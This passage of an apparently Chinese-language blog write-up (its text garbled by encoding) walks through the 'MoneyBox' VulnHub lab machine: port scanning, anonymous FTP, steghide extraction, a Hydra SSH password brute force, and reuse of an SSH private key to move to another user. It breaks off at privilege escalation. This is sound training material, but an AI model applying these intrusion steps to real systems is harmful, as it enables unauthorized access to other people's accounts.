class="line">MAC Address: 08:00:27:0F:86:5F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds</span><br></pre></td></tr></table></figure><p><code>è·å–åˆ°bannerä¿¡æ¯åï¼Œå¯ä»¥ä½¿ç”¨-sCå‚æ•°å¯¹å„ä¸ªç«¯å£è¿›è¡Œé»˜è®¤è„šæœ¬æ‰«æï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°21ç«¯å£å¯¹åº”çš„FTPæœåŠ¡å¯ä»¥è¿›è¡ŒåŒ¿åç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ sudo nmap -sC -p21,22,80 192.168.56.103</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-26 02:09 EDT</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.56.103</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.56.104</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)</span><br><span class="line">|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)</span><br><span class="line">|_  256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_http-title: MoneyBox</span><br><span class="line">MAC Address: 08:00:27:0F:86:5F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.02 seconds</span><br></pre></td></tr></table></figure><h2 id="0x03-FTPåŒ¿åç™»å…¥"><a href="#0x03-FTPåŒ¿åç™»å…¥" class="headerlink" title="0x03.FTPåŒ¿åç™»å…¥"></a>0x03.FTPåŒ¿åç™»å…¥</h2><p><code>ä¹‹å‰è·å–åˆ°äº†FTPæœåŠ¡å­˜åœ¨åŒ¿åç™»å…¥ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥è¿›è¡Œç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ ftp 192.168.56.103</span><br><span class="line">Connected to 192.168.56.103.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.56.103:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure><p><code>å°è¯•åˆ‡æ¢ç›®å½•ä¸æŸ¥çœ‹æ–‡ä»¶ã€‚å¯ä»¥çœ‹åˆ°ä¸èƒ½åˆ‡æ¢ç›®å½•ï¼Œä¸”åªæœ‰ä¸€ä¸ªjpgå›¾ç‰‡ï¼Œåå­—ä¸ºtrytofindè§†ä¹æ˜¯åœ¨æç¤ºæˆ‘ä»¬ä»€ä¹ˆã€‚</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">257 &quot;/&quot; is the current directory</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">cd</span> /</span></span><br><span class="line">250 Directory successfully changed.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure><p><code>ä¸‹è½½trytofind.jpgè¿›è¡Œåˆ†æï¼Œå›¾ç‰‡å¦‚ä¸‹ï¼Œæ²¡ä»€ä¹ˆå¯ç”¨ä¿¡æ¯ï¼(å…¶å®è¿˜æœ‰ï¼Œä¸‹ä¸€æ­¥å†è¯´:)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get trytofind.jpg</span></span><br><span class="line">local: trytofind.jpg remote: trytofind.jpg</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">1093656 bytes received in 0.05 secs (21.3356 MB/s)</span><br></pre></td></tr></table></figure><img src="/2021/10/26/MoneyBox/image-20211026145731037.png" class><h2 id="0x04-è®¿é—®httpæœåŠ¡"><a href="#0x04-è®¿é—®httpæœåŠ¡" class="headerlink" title="0x04.è®¿é—®httpæœåŠ¡"></a>0x04.è®¿é—®httpæœåŠ¡</h2><p><code>å‰é¢å‘ç°äº†80ç«¯å£ï¼Œæ‰€ä»¥è¿™é‡Œè®¿é—®httpæœåŠ¡çœ‹çœ‹æ˜¯å¦æœ‰åˆ©ç”¨çš„ä¿¡æ¯</code></p><img src="/2021/10/26/MoneyBox/image-20211026153257042.png" class><p><code>åªæ˜¯ä¸€ä¸ªé™æ€é¡µé¢ï¼Œæºç ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆï¼Œæ¥ä¸‹æ¥ï¼Œæ‰«æç›®å½•</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ dirb http://192.168.56.103                                                        255 â¨¯</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Tue Oct 26 03:09:37 2021</span><br><span class="line">URL_BASE: http://192.168.56.103/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.103/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/blogs/                                                </span><br><span class="line">+ http://192.168.56.103/index.html (CODE:200|SIZE:621)                                     </span><br><span class="line">+ http://192.168.56.103/server-status (CODE:403|SIZE:279)                                  </span><br><span class="line">                                                                                           </span><br><span class="line">---- Entering directory: http://192.168.56.103/blogs/ ----</span><br><span class="line">+ http://192.168.56.103/blogs/index.html (CODE:200|SIZE:353)                               </span><br><span class="line">                                                                                           </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Oct 26 03:09:41 2021</span><br><span class="line">DOWNLOADED: 9224 - FOUND: 3</span><br></pre></td></tr></table></figure><p><code>å‘ç°äº†blogsç›®å½•ï¼Œè®¿é—®å®ƒã€‚æŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€ä¸ªç§˜å¯†çš„ç›®å½•ï¼Œç»§ç»­è®¿é—®å®ƒï¼</code></p><img src="/2021/10/26/MoneyBox/image-20211026153750103.png" class><p><code>è¿™é‡Œå‘ç°ä¸€ä¸ªå¯†é’¥(3xtr4ctd4t4)ï¼Œå…ˆç•™ç€</code></p><img src="/2021/10/26/MoneyBox/image-20211026153955789.png" class><h2 id="0x05-æŸ¥çœ‹å›¾ç‰‡é‡Œéšå†™çš„ä¿¡æ¯"><a href="#0x05-æŸ¥çœ‹å›¾ç‰‡é‡Œéšå†™çš„ä¿¡æ¯" class="headerlink" title="0x05.æŸ¥çœ‹å›¾ç‰‡é‡Œéšå†™çš„ä¿¡æ¯"></a>0x05.æŸ¥çœ‹å›¾ç‰‡é‡Œéšå†™çš„ä¿¡æ¯</h2><p>åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬çš„æµ‹è¯•ä¼¼ä¹é‡åˆ°äº†ç“¶é¢ˆæœŸï¼Œä½†ç»™æˆ‘ä»¬çš„hintå´æ˜¯(è¿™æ˜¯ä¸€ä¸ªéå¸¸å®¹æ˜“çš„é¶æœºï¼Œä¸è¦æƒ³å¤ªå¤š)ï¼Œæ¥ä¸‹æ¥ç»§ç»­ä»¥å›¾ç‰‡ä¸ºçªç ´ç‚¹ï¼</p><p><code>ä½¿ç”¨stringsæŸ¥çœ‹å›¾ç‰‡ä¸­çš„å­—ç¬¦ä¸²ä¿¡æ¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ strings trytofind.jpg | head -n 15</span><br><span class="line">JFIF</span><br><span class="line"> , #&amp;&#x27;)*)</span><br><span class="line"><span class="meta">-0-(0%</span><span class="bash">()(</span></span><br><span class="line">((((((((((((((((((((((((((((((((((((((((((((((((((</span><br><span class="line"><span class="meta">$</span><span class="bash">3br</span></span><br><span class="line"><span class="meta">%</span><span class="bash">&amp;<span class="string">&#x27;()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</span></span></span><br><span class="line">        #3R</span><br><span class="line">&amp;&#x27;()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</span><br><span class="line">p=*5$</span><br><span class="line">\sH@</span><br><span class="line"> &quot;PCv</span><br><span class="line">N&#x27; g</span><br><span class="line">.&#125;F1@</span><br><span class="line"><span class="meta">@#</span><span class="bash">u-</span></span><br><span class="line">&#125;h_n</span><br></pre></td></tr></table></figure><p><code>å¯ä»¥çœ‹åˆ°ï¼Œè¿™å¹¶ä¸æ˜¯ä¸€ä¸ªæ­£å¸¸çš„å›¾ç‰‡å¤´ï¼Œä½¿ç”¨steghideæŸ¥çœ‹å›¾ç‰‡ä¿¡æ¯ï¼Œè¿™é‡Œä¾¿ä½¿ç”¨åˆ°äº†å‰é¢å‘ç°çš„å¯†é’¥(3xtr4ctd4t4)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ steghide info trytofind.jpg </span><br><span class="line">&quot;trytofind.jpg&quot;:</span><br><span class="line">  format: jpeg</span><br><span class="line">  capacity: 64.2 KB</span><br><span class="line">Try to get information about embedded data ? (y/n) y</span><br><span class="line">Enter passphrase: </span><br><span class="line">  embedded file &quot;data.txt&quot;:</span><br><span class="line">    size: 136.0 Byte</span><br><span class="line">    encrypted: no</span><br><span class="line">    compressed: no</span><br></pre></td></tr></table></figure><p><code>å¯ä»¥çœ‹åˆ°å›¾ç‰‡ä¸­å­˜åœ¨ä¸€ä¸ªdata.txtæ–‡ä»¶ï¼ŒæŠŠä»–æå–å‡ºæ¥ã€‚æ ¹æ®æç¤ºï¼Œrenuç”¨æˆ·å­˜åœ¨å¼±å£ä»¤</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ steghide extract -sf trytofind.jpg</span><br><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;data.txt&quot;.</span><br><span class="line">                                                                                            </span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ cat data.txt     </span><br><span class="line">Hello.....  renu</span><br><span class="line"></span><br><span class="line">      I tell you something Important.Your Password is too Week So Change Your Password</span><br><span class="line">Don&#x27;t Underestimate it.......</span><br><span class="line"></span><br><span class="line">                              </span><br></pre></td></tr></table></figure><h2 id="0x06-çˆ†ç ´renu"><a href="#0x06-çˆ†ç ´renu" class="headerlink" title="0x06.çˆ†ç ´renu"></a>0x06.çˆ†ç ´renu</h2><p><code>æ ¹æ®æç¤ºä¿¡æ¯ï¼Œå¯¹renuè¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°å¯†ç ä¸º987654321</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ hydra -l renu -P ./rockyou.txt ssh://192.168.56.103</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-26 04:00:35</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.56.103:22/</span><br><span class="line">[22][ssh] host: 192.168.56.103   login: renu   password: 987654321</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 5 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 5 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 target did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-26 04:00:56</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>sshç™»å…¥ï¼Œè¿™æ ·å°±å¾—åˆ°äº†ç¬¬ä¸€æ¡flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ ssh renu@192.168.56.103                                                           255 â¨¯</span><br><span class="line">The authenticity of host &#x27;192.168.56.103 (192.168.56.103)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:8GzSoXjLv35yJ7cQf1EE0rFBb9kLK/K1hAjzK/IXk8I.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.56.103&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">renu@192.168.56.103&#x27;s password: </span><br><span class="line">Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Fri Feb 26 08:53:43 2021 from 192.168.43.44</span><br><span class="line">renu@MoneyBox:~$ ls</span><br><span class="line">ftp  user1.txt</span><br><span class="line">renu@MoneyBox:~$ cat user1.txt </span><br><span class="line">Yes...!</span><br><span class="line">You Got it User1 Flag</span><br><span class="line"></span><br><span class="line"> ==&gt; us3r1&#123;F14g:0ku74tbd3777y4&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x07-åˆ‡æ¢åˆ°lilyç”¨æˆ·"><a href="#0x07-åˆ‡æ¢åˆ°lilyç”¨æˆ·" class="headerlink" title="0x07.åˆ‡æ¢åˆ°lilyç”¨æˆ·"></a>0x07.åˆ‡æ¢åˆ°lilyç”¨æˆ·</h2><p><code>ç™»å…¥åˆ°renuç”¨æˆ·åï¼ŒæŸ¥çœ‹renuæ˜¯å¦æœ‰sudoæƒé™ï¼Œè¿›è¡Œææƒï¼Œå¯æƒœä»–æ²¡æœ‰ã€‚ä½†æŸ¥çœ‹historyå¯ä»¥å‘ç°ä¸€äº›åˆ©ç”¨ä¿¡æ¯</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">renu@MoneyBox:~$ sudo -s</span><br><span class="line">[sudo] password for renu: </span><br><span class="line">renu is not in the sudoers file.  This incident will be reported.</span><br><span class="line">renu@MoneyBox:~$ history </span><br><span class="line">    1  cler</span><br><span class="line">    2  ls</span><br><span class="line">    3  ls -la</span><br><span class="line">    4  cd /home</span><br><span class="line">    5  ls</span><br><span class="line">    6  clear</span><br><span class="line">    7  cd</span><br><span class="line">    8  ls</span><br><span class="line">    9  ls -la</span><br><span class="line">   10  exit</span><br><span class="line">   11  clear</span><br><span class="line">   12  ls</span><br><span class="line">   13  ls -la</span><br><span class="line">   14  cd /home</span><br><span class="line">   15  ls</span><br><span class="line">   16  cd lily</span><br><span class="line">   17  ls</span><br><span class="line">   18  ls -la</span><br><span class="line">   19  clear</span><br><span class="line">   20  cd</span><br><span class="line">   21  clear</span><br><span class="line">   22  ssh-keygen -t rsa</span><br><span class="line">   23  clear</span><br><span class="line">   24  cd .ssh</span><br><span class="line">   25  ls</span><br><span class="line">   26  ssh-copy-id lily@192.168.43.80</span><br><span class="line">   27  clear</span><br><span class="line">   28  cd</span><br><span class="line">   29  cd -</span><br><span class="line">   30  ls -l</span><br><span class="line">   31  chmod 400 id_rsa</span><br><span class="line">   32  ls -l</span><br><span class="line">   33  ssh -i id_rsa lily@192.168.43.80</span><br><span class="line">   34  clear</span><br><span class="line">   35  ssh -i id_rsa lily@192.168.43.80</span><br><span class="line">   36  cd</span><br><span class="line">   37  clear</span><br><span class="line">   38  cd .ssh/</span><br><span class="line">   39  ls</span><br><span class="line">   40  ssh -i id_rsa lily@192.168.43.80</span><br><span class="line">   41  su lily</span><br><span class="line">   42  clear</span><br><span class="line">   43  cd</span><br><span class="line">   44  sudo apt install openssh</span><br><span class="line">   45  sudo apt update</span><br><span class="line">   46  sudo apt install openssh-server</span><br><span class="line">   47  sudo service ssh start</span><br><span class="line">   48  sudo service ssh status</span><br><span class="line">   49  clear</span><br><span class="line">   50  cd /etc/</span><br><span class="line">   51  ls</span><br><span class="line">   52  cd ssh</span><br><span class="line">   53  ls</span><br><span class="line">   54  nano ssh_config </span><br><span class="line">   55  ls</span><br><span class="line">   56  nano sshd_config </span><br><span class="line">   57  clear</span><br><span class="line">   58  cd</span><br><span class="line">   59  ls</span><br><span class="line">   60  ls -la</span><br><span class="line">   61  chsh bash</span><br><span class="line">   62  chsh</span><br><span class="line">   63  clear</span><br><span class="line">   64  su root</span><br><span class="line">   65  clear</span><br><span class="line">   66  sudo apt install openssh</span><br><span class="line">   67  su root</span><br><span class="line">   68  exit</span><br><span class="line">   69  ls</span><br><span class="line">   70  cat user1.txt </span><br><span class="line">renu@MoneyBox:~$</span><br></pre></td></tr></table></figure><p><code>æ ¹æ®å†å²ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œrenuç”¨æˆ·ç”Ÿæˆäº†sshå…¬é’¥å¹¶å¤åˆ¶åˆ°äº†lilyç”¨æˆ·çš„.sshç›®å½•ä¸‹ï¼Œæ¥ç€renuä½¿ç”¨ç§é’¥ç™»å…¥åˆ°äº†lilyç”¨æˆ·ä¸‹ã€‚å¹¶ä¸”å½“å‰æœåŠ¡å™¨ä¹Ÿå­˜åœ¨ä¸€ä¸ªlilyç”¨æˆ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å‘ç°çš„lilyç”¨æˆ·æ˜¯å¦æ˜¯å½“å‰æœåŠ¡å™¨ä¸Šçš„lilyå‘¢ï¼Ÿç­”æ¡ˆæ˜¯YESã€‚ç™»å…¥åå¾—åˆ°ç¬¬äºŒä¸ªflag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">renu@MoneyBox:~/.ssh$ ssh -i id_rsa lily@192.168.56.103</span><br><span class="line">Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Oct 24 06:32:41 2021 from 192.168.56.103</span><br><span class="line">lily@MoneyBox:~$ whoami</span><br><span class="line">lily</span><br><span class="line">lily@MoneyBox:~$ id</span><br><span class="line">uid=1000(lily) gid=1000(lily) groups=1000(lily),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br><span class="line">lily@MoneyBox:~$ ls</span><br><span class="line">user2.txt</span><br><span class="line">lily@MoneyBox:~$ cat user2.txt </span><br><span class="line">Yeah.....</span><br><span class="line">You Got a User2 Flag</span><br><span class="line"></span><br><span class="line">==&gt; us3r&#123;F14g:tr5827r5wu6nklao&#125;</span><br><span class="line"></span><br><span class="line">lily@MoneyBox:~$</span><br></pre></td></tr></table></figure><h2 id="0x08-ææƒ"><a href="#0x08-ææƒ" class="headerlink" title="0x08.ææƒ"></a>0x08.ææƒ</h2><p><code>æ ¹æ®vulnhubçš„å¥—è·¯ï¼Œç¬¬ä¸‰ä¸ªflagä¸€å®šåœ¨rootç”¨æˆ·ä¸‹ã€‚æŸ¥çœ‹historyï¼Œå‘ç°lilyç”¨æˆ·æŸ¥æ‰¾è¿‡å…·æœ‰suidæƒé™çš„æ–‡ä»¶ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ã€‚ç„¶è€Œlilyç”¨æˆ·å­˜åœ¨sudoæƒé™</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 